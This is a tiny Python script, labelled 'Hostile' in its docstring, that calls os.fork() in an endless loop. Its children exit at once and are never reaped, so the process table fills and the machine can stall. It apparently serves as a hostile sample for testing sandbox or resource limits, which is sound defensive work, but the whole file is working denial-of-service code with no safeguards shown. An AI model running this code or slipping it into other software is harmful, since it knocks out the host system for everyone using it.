"""Hostile: fork children forever, exhausting the process table."""

import os

while True:
    pid = os.fork()
    if pid == 0:
        os._exit(0)
